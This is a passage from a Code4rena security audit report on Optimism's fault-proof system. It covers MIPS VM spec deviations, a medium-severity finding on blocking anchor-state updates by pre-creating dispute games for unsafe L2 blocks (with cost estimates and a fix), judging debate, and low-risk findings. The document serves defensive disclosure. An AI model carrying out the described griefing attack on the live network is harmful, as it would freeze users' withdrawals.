An inconsistent implementation of big-endian 32-bit MIPS32 architecture in the `MIPS` contract allows malicious actors to successfully forge invalid claims and challenge valid claims.

### Recommended Mitigation Steps

Consider raising Integer Overflow exception for `ADD`, `ADDI`, and `SUB` instructions if overflow occurs.

### Assessed type

Math

**[clabby (Optimism) confirmed and commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/15#issuecomment-2260891821):**
 > This report is valid, and it is a duplicate of `3.3.4` from the Cantina report on the MIPS VM.

**[KupiaSec (warden) commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/15#issuecomment-2265771115):**
 > @obront - `op-program` ran means there was no overflow exception happened in runtime, so the issue is not valid.

**[rileyholterhus (warden) commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/15#issuecomment-2267343821):**
 > Without commenting on individual issue validity or how things should be grouped, I would like to point out that the following issues are currently judged as medium-severity:
> 
> - [#89](https://github.com/code-423n4/2024-07-optimism-findings/issues/89)
> - [#85](https://github.com/code-423n4/2024-07-optimism-findings/issues/85)
> - [#82](https://github.com/code-423n4/2024-07-optimism-findings/issues/82)
> - [#41](https://github.com/code-423n4/2024-07-optimism-findings/issues/41)
> 
> The above issues all attempt to point out deviations from the MIPS spec that may or may not be reachable in op-program. I think this issue is another example of this, but it is currently high-severity.

**[obront (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/15#issuecomment-2276662715):**
 > The original thinking when judging this issue was that it could be presently exploited (whereas the other issues @rileyholterhus mentioned exposed deviations from the spec, but that we don't currently have a way to exploit).
> 
> After some more digging and experimentation, it appears that there isn't a current way to trigger this issue, as the overflow would revert when op-program is running. 
> 
> This puts it in the same bucket as the other issues mentioned:
> - It is a deviation from spec.
> - If we could trigger it, we could get on chain MIPS to provide invalid values.
> - This could be exploited in incredibly harmful ways.
> - But presently, there is no known way to trigger it (and it shouldn't be possible, given that op-program ran).
> 
> All issues that fit this criteria will be awarded as Medium, so this will be downgraded to align with that.

***

## [[M-11] Attacker can continuously create games for not yet safe l2 blocks to prevent the update of anchor state](https://github.com/code-423n4/2024-07-optimism-findings/issues/6)
*Submitted by [xuwinnie](https://github.com/code-423n4/2024-07-optimism-findings/issues/6), also found by [0x1771](https://github.com/code-423n4/2024-07-optimism-findings/issues/103)*

When creating a dispute game, the output root should be one of the safe l2 block's. However, attacker can continuously create games for not yet safe l2 blocks. Honest party can no longer propose the root after it becomes safe, since UUID must be unique. As a result, no root can be successfully defended, the anchor state can no longer be updated and the fund on L2 will be frozen.

### Proof of Concept

When creating a dispute game, the output root should be one of the safe l2 block's. Otherwise, the claim can be attacked.

However, function create needs uuid to be unique.

        // Compute the unique identifier for the dispute game.
        Hash uuid = getGameUUID(_gameType, _rootClaim, _extraData);

        // If a dispute game with the same UUID already exists, revert.
        if (GameId.unwrap(_disputeGames[uuid]) != bytes32(0)) revert GameAlreadyExists(uuid);

If an attacker has already made the claim of this block earlier, when the block is still unsafe, the correct claim can no longer be made.

### Cost and Impact

Attacker can avoid losing the bond by making a attack move in the same transaction, needing `0.08 (create) + 0.08 (attack) = 0.16eth` once. The fund will be withdrawable after `3.5 (game clock) + 7 (weth delay) = 10.5 days`. 

Assume block time is 2s, the capital needed is `0.16 × 10.5 × 24 × 3600 ÷ 2 = 72576eth ≈ 237 million dollars`. Assume interest rate is 3%, to freeze l2 fund for **one year**, the cost would be `237 million × 3% = 7.11 million dollars`, while the loss would be `13.54 billion (Optimism + Base TVL) × 3% = 406.2 million dollars`.

### Fix

Include `parentHash` in uuid calculation.

### Assessed type

Context

**[ajsutton (Optimism) acknowledged and commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/6#issuecomment-2259460726):**
 > The report is correct; however, the claimed loss is dramatically overstated since it is not expected that the entire TVL of op-mainnet and base are trying to be withdrawn. Additionally, the attacker would have to ensure they create a proposal for every unsafe block before they become safe - if a single block is missed all pending withdrawals could be proven against the proposal for that block.
> 
> The attacker would also be relying on the batcher submitting transactions that exactly match the unsafe blocks. While this is typically the case and is intended in the smooth operation of a chain, it is not guaranteed. If the actual safe block did differ from the attacker's proposed root the actual root could still be used for a proposal. For any in progress games, the attacker would be at risk of losing the bond for both their root claim and their counter claim, as the value specified in the counter claim would now be invalid, allowing an honest actor to counter it and post their own counter to the root claim.
> 
> The attacker would also lose money in gas costs for creating each game (~421k gas each), posting the counter claim to avoid losing their bond (~231k gas each) and then reclaiming their bonds after the lock up period.

**[obront (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/6#issuecomment-2264375023):**
 > I respect the sponsor's perspective here that this issue is unlikely to become a serious concern, but after carefully considering it, I've decided that the ability to create failing games for valid output roots that will block the correct game from being created seems to be a valid issue. I will be downgrading to Medium and accepting.

**[EV_om (warden) commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/6#issuecomment-2266738215):**
 > > the ability to create failing games for valid output roots that will block the correct game from being created seems to be a valid issue
> 
> I completely agree with the above and I think this is a really nice finding.
> 
> However, the severity should be assessed according to the highest realistic impact and this finding fails to provide one that would qualify it for Medium severity.
> 
> Let's examine the costs of this attack. As @ajsutton mentioned, the costs are not limited to the opportunity cost of the significant capital required, but also include the gas cost of creating and resolving claims for every single block, in particular for:
> 
> > creating each game (~421k gas each), posting the counter claim to avoid losing their bond (~231k gas each) and then reclaiming their bonds after the lock up period.
> 
> The latter requires:
> - 2 calls to `resolveClaim()` (~111k gas each).
> - 1 call to `resolve()` (~39k gas).
> - 1 call to `claimCredit()` (~55k gas).
> 
> All of this put together leads to a total of ~857k gas per censored block, which at an ETH price of `$3k`, a reasonable gas price of 20 gwei and a 2s L2 block time amount to a cost of `$2,2 million` per DAY that the attack is ongoing in addition to the already mentioned capital requirements and opportunity loss.
> 
> This together with the fact that the attack can be easily mitigated by migrating to a new game type means the likelihood that this is exploited (to no benefit for the attacker) and actually impacts the availability of the protocol is essentially non-existent. (Edit: just a quick note that migrating to a new game is not [one of the safeguards](https://github.com/code-423n4/2024-07-optimism?tab=readme-ov-file#what-are-the-current-safeguards) that should be considered nonexistent for this audit)
> 
> The issue was also brought up [here](https://github.com/sherlock-audit/2024-02-optimism-2024-judging/issues/175) in the previous audit (specific attack vector of the L1 block being too early is mentioned "e.g., the L1 parent block is too early" as well as the inability to create another game, without the DOS claims).

**[xuwinnie (warden) commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/6#issuecomment-2267180904):**
 > @EV_om 
> 1. The impact is critical, not low. How could you call “freeze whole l2 fund for one year” low?
> 2. Gas price has dropped after Cancun and will continue to drop. It should not be used as an argument. OP TVL will grow to 1 trillion and the attack cost will eventually be negligible.
> 3. Attacker can short `$OP` to take profit, panic would be huge.
> 4. In my report, neither L1 nor L2 block is too early.
> 5. The report you mentioned misses two key points. It does not point of proposed block should be **safe** It does not utilize **create game for every block** to DOS. Basically, it just says there could be something wrong without describing how it could actually be wrong.
> 
> >For the sake of this audit, you should pretend the safeguards don't exist.
> 
> Under the context of this audit, the max damage could be permanently freezing the l2 fund. So I believe this is a high severity issue @obront 
> 
> >The attacker would also be relying on the batcher submitting transactions that exactly match the unsafe blocks.
> 
> Even they don't match, attacker can still monitor mempool and frontrun batcher's the transaction.

**[obront (judge) commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/6#issuecomment-2269640958):**
 > While I agree with @EV_om that the cost to the attacker is large and doesn't provide obvious benefit (such that I don't think DOS'ing the chain for a year is at all likely), I do believe a Medium severity is justified.
> 
> 1. As @xuwinnie mentioned, gas prices have dropped a lot. I don't think it's unreasonable to think that 2 gwei will often be a better estimate than 20 gwei.
> 
> 2. At least to start, every OP Mainnet block doesn't need to be proven. Proposals are created once per hour (https://etherscan.io/address/0xe5965Ab5962eDc7477C8520243A95517CD252fA9), and if we read the op-proposer code (https://github.com/ethereum-optimism/optimism/blob/d283e9be6e3ff9294c61634bda0131c373ecaaf8/op-proposer/proposer/driver.go#L471-L492) we can see that it doesn't matter whether past proposals landed. It just tries at regular interval from config, which is set to 1 hour. Until OP team changed the config and relaunched the proposer, it would only take a couple txs per hour to make sure it was blocked.
> 
> 3. We can't predict situations where delaying ability to withdraw for some period of time would be harmful.
> 
> I agree that this is unlikely and benefit is unclear enough that it shouldn't be a High, but I think Medium is warranted and the code should be corrected, so will keep judging as-is.

**[ajsutton (Optimism) commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/6#issuecomment-2269974232):**
 > I'm staying well out of the debate around severity levels but I think it's worth clarifying:
> 
> > At least to start, every OP Mainnet block doesn't need to be proven. Proposals are created once per hour.
> 
> Proposals are permissionless, so any user whose withdrawal is blocked can propose for any L2 block (which could then be used for any pending withdrawals).  So for this attack to be at all effective you need to create a game for every L2 block, not just the block that winds up being the next safe head. Any user who would be harmed by a delay to their withdrawal would also be incentivised to make their own proposal.

**[obront (judge) commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/6#issuecomment-2270198456):**
 > @ajsutton - That's fair. I still believe Medium is the right classification, but appreciate the correction.

***

# Low Risk and Non-Critical Issues

For this audit, 21 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2024-07-optimism-findings/issues/45) by **RadiantLabs** received the top score from the judge.

*The following wardens also submitted reports: [oakcobalt](https://github.com/code-423n4/2024-07-optimism-findings/issues/50), [Zubat](https://github.com/code-423n4/2024-07-optimism-findings/issues/49), [bronze\_pickaxe](https://github.com/code-423n4/2024-07-optimism-findings/issues/119), [Bauchibred](https://github.com/code-423n4/2024-07-optimism-findings/issues/117), [sivanesh\_808](https://github.com/code-423n4/2024-07-optimism-findings/issues/114), [Al-Qa-qa](https://github.com/code-423n4/2024-07-optimism-findings/issues/113), [SeveritySquad](https://github.com/code-423n4/2024-07-optimism-findings/issues/112), [n4nika](https://github.com/code-423n4/2024-07-optimism-findings/issues/97), [arabgodx](https://github.com/code-423n4/2024-07-optimism-findings/issues/91), [ether\_sky](https://github.com/code-423n4/2024-07-optimism-findings/issues/34), [Femboys](https://github.com/code-423n4/2024-07-optimism-findings/issues/18), [alexfilippov314](https://github.com/code-423n4/2024-07-optimism-findings/issues/17), [xuwinnie](https://github.com/code-423n4/2024-07-optimism-findings/issues/11), [twcctop](https://github.com/code-423n4/2024-07-optimism-findings/issues/118), [Naresh](https://github.com/code-423n4/2024-07-optimism-findings/issues/116), [Dup1337](https://github.com/code-423n4/2024-07-optimism-findings/issues/111), [Sparrow](https://github.com/code-423n4/2024-07-optimism-findings/issues/110), [Prestige](https://github.com/code-423n4/2024-07-optimism-findings/issues/109), [Walter](https://github.com/code-423n4/2024-07-optimism-findings/issues/107), and [hihen](https://github.com/code-423n4/2024-07-optimism-findings/issues/47).*

## [01] MIPS: `sc` does not write a 0 to `rt` if the write is non-atomic

As per the MIPS ISA, `sc` will write a 1 to `rt` if a write is atomic and a 0 to `rt` is non-atomic. A write is atomic if the value of the memory address pointed to by the `sc` instruction has not been changed since the value of the same memory address has been loaded by the `ll` instruction. However, the `sc` implementation in the MIPS code will always write a 1 regardless of whether the write is atomic or non-atomic. 

 ```solidity 
	// stupid sc, write a 1 to rt
	if (opcode == 0x38 && rtReg != 0) {
		state.registers[rtReg] = 1;
	}
```

Since the VM is likely to not be implementing concurrency, the only impact of this is that it deviates from the MIPS specification, as the offchain MIPS VM has the same bug. 

## [02] MIPS: `state.step` can overflow if there are more than `2^64` MIPS instructions

`state.step` is incremented every MIPS instruction executed, it is a `uint64` variable so it can overflow if there are more than `2^64` MIPS instructions when `MAX_GAME_DEPTH - SPLIT_DEPTH - 2 = 64`.

```solidity
	state.step += 1;
```

## [03] MIPS: `_storeReg` should be zeroed for `mult`, `multu`, `div` and `divu`

The `mult`, `multu`, `div` and `divu` instructions are only supposed to write to `HI`, `LO` special registers. However, since they are R-type instructions, they can still have a non-zero `rd` value, though this would be an invalid instruction and lead to undefined behaviour. The MIPS VM do not zero out the `rd` value if the `rd` value for the `mult`, `multu`, `div`, `divu` instructions.

Therefore, if the `rd` value is non-zero, the register referenced by `rd` which is passed into `_storeReg` variable will be overwritten by `val` which will be 0, as seen in the snippet below.

```solidity
	// Store the result in the destination register, if applicable
	if (_storeReg != 0) {
		state.registers[_storeReg] = val;
	}
```

Since this is undefined behaviour, it does not contradict any MIPS spec and the onchain and offchain MIPS VM have the same behaviour but it might probably be best to resolve this.

## [04] MIPS: The wrong variable name `v1` is used to denote register 7 instead of `a3`

In `handleSyscall` the variable `v1` is used to refer to register 7 which is where the error code of the syscall is stored. However, the correct variable name of register 7 is `a3`. 

```solidity
	// Write the results back to the state registers
	state.registers[2] = v0;
	state.registers[7] = v1;
```
## [05] MIPS: Redundant assignment of `rdReg = rtReg`

The code pointed by the arrow is redundant because `rdReg` was assigned `rtReg` earlier in the function and has not been changed in the function flow.

```solidity
	// R-type or I-type (stores rt)
	rs = state.registers[(insn >> 21) & 0x1F];
	uint32 rdReg = rtReg; 

	if (opcode == 0 || opcode == 0x1c) { 
	...
	} else if (opcode >= 0x28 || opcode == 0x22 || opcode == 0x26) {
		// store rt value with store
		rt = state.registers[rtReg];

		// store actual rt with lwl and lwr
=>              rdReg = rtReg; // REDUNDANT
	}
```

## [06] MIPS: `(uint32) & 0xffFFffFF` bit-masking is redundant

`execute` will return a `uint32` value. Therefore, performing `(uint32) & 0xffFFffFF` is redundant. The comment is also wrong and the bit-masking is not required.

```solidity
	// ALU
	uint32 val = execute(insn, rs, rt, mem) & 0xffFFffFF; // swr outputs more than 4 bytes without the mask
```

The offchain MIPS VM also does not have this redundant bitmask.

## [07] PREIMAGE: `read` syscalls that read EOF might not be able to be executed via `step()` if `op-program` is compiled to MIPS in a certain way

A common way to detect an EOF is to perform a `read` syscall until the return value (the count of the number of bytes to read) is 0. When this happens, programs know that the end-of-file has been reached and will stop calling the `read()` syscall.

We believe that the op-program when compiled to MIPS will instead read the first 8 bytes of the preimage to determine the length and then perform the exact number of `read` syscalls to obtain the correct number of bytes from the preimage data. But because we don't actually know how it will be compiled, we are submitting this just in case it actually does the former.

If the MIPS program uses the former method to read the preimage data, the `read` syscall will revert because the part offset will be out of bounds and therefore cannot be inserted into the preimage oracle. Thus, this line will always revert because the `_offset` cannot be inserted into the preimage oracle because of OOB error.

```solidity
	require(preimagePartOk[_key][_offset], "pre-image must exist");
```

For instance, consider a preimage of length 100 (92 bytes of data and 8 bytes to store the length). To read the entire preimage you will need 25 syscalls to read the entire preimage, and 1 syscall to detect the EOF by returning 0.

The MIPS `read` syscall that returns 0 will have a `_partOffset` of 100, but this can't be inserted into the preimage oracle because in many of the functions, OOB error will occur because the `_partOffset` will be 100 which will equal to `size + 8` which is 100 and the function will revert.

```solidity
	// revert if part offset >= size+8 (i.e. parts must be within bounds)
	if iszero(lt(_partOffset, add(size, 8))) {
		// Store "PartOffsetOOB()"
		mstore(0x00, 0xfe254987)
		// Revert with "PartOffsetOOB()"
		revert(0x1c, 0x04)
	}
```

## [08] PREIMAGE: Non-zero bytes can end up in `preimageParts` after the tail end of the preimage of an LPP

In `_extractPreimagePart`, it is possible that non-zero bytes can be stored in the `proposalParts` and then the `preimageParts` because `calldataload` is used to load the next 32 bytes from the offset which will may overshoot the end of the `_input` calldata. Someone can craft calldata such that there can be non-zero bytes in the padding between the `_input` calldata and the `_stateCommitments` to store it in the `preimagePart`.

```solidity
	bytes32 preimagePart;
	assembly {
		preimagePart := calldataload(add(_input.offset, relativeOffset))
	}
	proposalParts[msg.sender][_uuid] = preimagePart;
```

This is not exploitable because the MIPS VM will use the `preimageLengths` to only read bytes up to the tail end of the preimage but it might be good defense-in-depth to fix this.

## [09] PREIMAGE: Non-zero bytes can end up in `preimageParts` after the tail end of the part from `loadPrecompilePreimagePart`

Since the `ptr` is reused, it is possible that non-zero bytes can end up after the tail end of the part if the `input` is larger than the `returndata`.

```solidity
	// Reuse the `ptr` to store the preimage part: <sizePrefix ++ precompileStatus ++ returrnData>
	// put size as big-endian uint64 at start of pre-image
	mstore(ptr, shl(192, size))
	ptr := add(ptr, 0x08)

	// write precompile result status to the first byte of `ptr`
	mstore8(ptr, res)
	// write precompile return data to the rest of `ptr`
	returndatacopy(add(ptr, 0x01), 0x0, returndatasize())

	// compute part given ofset
	part := mload(add(sub(ptr, 0x08), _partOffset))
```

This is also non-exploitable for the same reason as above.

## [10] PREIMAGE: Wrong comparison operator in `relativeOffset` may cause unintentional reverts

In the below snippet, the case `relativeOffset + 32 == _input.length` is fine because only calldata up to `relativeOffset + 31` will be loaded. This can cause unnecessary reverts when adding leaves in chunks that lead to equality in the below condition, but it is always possible to add them `s.t.` the last leaf in the call that would have failed is accompanied by the next one, and then the call succeeds.

```solidity
	// Revert if the full preimage part is not available in the data we're absorbing. The submitter must
	// supply data that contains the full preimage part so that no partial preimage parts are stored in the
	// oracle. Partial parts are *only* allowed at the tail end of the preimage, where no more data is available
	// to be absorbed.
	if (relativeOffset + 32 >= _input.length && !_finalize) revert PartOffsetOOB();
```

## [11] PREIMAGE: `.length` should be used instead of `calldataload` to determine `size`

For both `loadKeccak256PreimagePart` and `loadSha256PreimagePart`, it is better to use `.length` instead of using `calldataload` at a fixed offset to determine the length of calldata, because calldata offsets can be manipulated.

```solidity
            size := calldataload(0x44)
```

## [12] PREIMAGE: It is possible to call `addLeavesLPP()` with 0-length `_input`

There is no zero value check on the length of `_input` in `addLeavesLPP()`. The only side effects this has is that:
- If `offset < 8 && currentSize == 0`, the wrong preimage part will be written to `proposalParts`, but this will be overwritten in the next call actually passing the input.
- The block number is added to `proposalBlocks`.

## [13] PREIMAGE: Absorption and permutation are redundant in `squeezeLPP`

The `squeezeLPP` function performs unnecessary absorption and permutation operations on the state matrix. These operations are redundant because the state commitments already contain this information. The function could be simplified by directly using the post-state matrix.

Instead of absorbing and permuting the input bytes, the function should take the state matrix after absorption of the post-state as an input. It should then verify this matrix against the `_postState.stateCommitment` before performing the squeeze operation. 

As per the inline comments:

> We perform no final verification on the state matrix here, since the proposal has passed the challenge period and is considered valid.

So this also goes for the final state commitment which could be used directly.

```solidity
        LibKeccak.absorb(_stateMatrix, _postState.input);
        LibKeccak.permutation(_stateMatrix);
        bytes32 finalDigest = LibKeccak.squeeze(_stateMatrix);
```

## [14] PREIMAGE: `addLeavesLPP` not required to `finalize` on last leaf

When the last leaf is added, it is not actually required to set `_finalize` to true. This only works if `claimedSize % BLOCK_SIZE_BYTES == 0`, as otherwise the input will not be padded and the following check will fail:

```solidity
            if or(mod(inputLen, 136), iszero(eq(_stateCommitments.length, div(inputLen, 136)))) {
```

For the call to succeed, one must pass all but the last state commitment, which corresponds to the empty block which is added as padding at the end in the case `_input % BLOCK_SIZE_BYTES == 0`.

The LPP can still be finalized later by passing no input and the last state commitment.

## [15] PREIMAGE: Off-by-one error in `readPreimage`

In `readPreimage`, when `_offset + 32 == length + 8` then `datLen_` will be 32 and we don't need to enter the `if` statement but still do because of the `>=` comparison operator.

```solidity
  datLen_ = 32;
  if (_offset + 32 >= length + 8) {
      datLen_ = length + 8 - _offset;
  }
```

## [16] PREIMAGE: Return type of `partOffset_` in `CannonTypes` should be `uint32`

The return type of `partOffset_` in `CannonTypes` should be `uint32`.
```solidity
    function partOffset(LPPMetaData _self) internal pure returns (uint64 partOffset_) {
        assembly {
            partOffset_ := and(shr(160, _self), U32_MASK)
        }
    }
```

## [17] PREIMAGE: If a keccak256 preimage is larger than the max size of an LPP, a valid state referencing it cannot be proven

Keccak256 hashes of data larger than `136 * MAX_LEAF_COUNT` bytes are possible on L2s with a higher block gas limit.

We think only hashes originated on L1 will need to be provided in LPPs; hence, we are only submitting this as QA. However, if it is necessary to provide such a preimage, the `MAX_LEAF_COUNT` in the current implementation of LPPs will not be sufficient. It will not be possible to use `loadKeccak256PreimagePart()` either, due to exceeding calldata limitation and block size limit, which could potentially prevent a valid state form being proven.

## [18] PREIMAGE: If a sha256 preimage extremely large, a valid state consisting it cannot be proven

We don't know how large a sha256 preimage can be, but if it's extremely large, it cannot be added to the oracle via the `loadSha256PreimagePart` due to exceeding block gas limits and the lack of a streaming option for it; a valid state potentially cannot be proven.

## [19] FDG: LPP cost may not cover bonds at `MAX_GAME_DEPTH` when gas is expensive.

The bond for a `MAX_GAME_DEPTH` claim is fixed at `300_000_000 * 200 Gwei = 60 ETH` which is meant to cover double the estimated cost of a passing a maximum size LPP. However, the gas price is actually dynamic and dependent on factors such as network demand for gas (EIP-1559).

According to our calculations, the costs of submitting a max-size LPP can be optimized to slightly below `100_000_000` gas. Hence, the estimated gas cost will generally be well above the expected cost, as well as the 200 gas price being a very generous estimate.

Nevertheless, it is technically possible that the actual gas costs surpass the bond if the gas price rises above 600 gwei. In that case, the total cost for passing a maximum size LPP will exceed the bond reimbursed to the user, leading to less incentives to pass the LPP. Consider adapting the bond based on the current `tx.gasprice` at the time a move at `MAX_GAME_DEPTH - 1` is made.

## [20] FDG: The new `CLOCK_EXTENSION` feature can be abused to extend the dispute game above 7 days.

The `CLOCK_EXTENSION` feature is a newly added feature that extends the remaining time left of a team to 3 hours if they have less than 3 hours left on the clock. 

```solidity
        // If the remaining clock time has less than `CLOCK_EXTENSION` seconds remaining, grant the potential
        // grandchild's clock `CLOCK_EXTENSION` seconds. This is to ensure that, even if a player has to inherit another
        // team's clock to counter a freeloader claim, they will always have enough time to to respond. This extension
        // is bounded by the depth of the tree. If the potential grandchild is an execution trace bisection root, the
        // clock extension is doubled. This is to allow for extra time for the off-chain challenge agent to generate
        // the initial instruction trace on the native FPVM.
        if (nextDuration.raw() > MAX_CLOCK_DURATION.raw() - CLOCK_EXTENSION.raw()) {
            // If the potential grandchild is an execution trace bisection root, double the clock extension.
            uint64 extensionPeriod =
                nextPositionDepth == SPLIT_DEPTH - 1 ? CLOCK_EXTENSION.raw() * 2 : CLOCK_EXTENSION.raw();
            nextDuration = Duration.wrap(MAX_CLOCK_DURATION.raw() - extensionPeriod);
        }
```

It is possible for an attacker to always extend a game by creating a long chain of games in the dispute game and making a move below the 3 hour duration in order to extend it; although, they will likely lose their bonds for doing so. This is bound by the `MAX_GAME_DEPTH` which is 73 on mainnet, and therefore, the maximum time the game can be extended by will be `73 * 3 hours = 219 hours = ~9 days`.

Although this is intentional as acknowledged by the NatSpec, it is still a possible attack and so that is why we filed it here.

## [21] FDG: Honest challengers can lose their bonds when proposing valid root claims that will become invalid in the event of chain reorgs.

In the event of a chain reorg, valid root claims can become invalid because the L2 state and correct output can change. The honest challenger can lose their bonds as a result of this because `DisputeGameFactory.create()` does not have any protections against this.

***

# Disclosures

C4 is an open organization governed by participants in the community.

C4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.
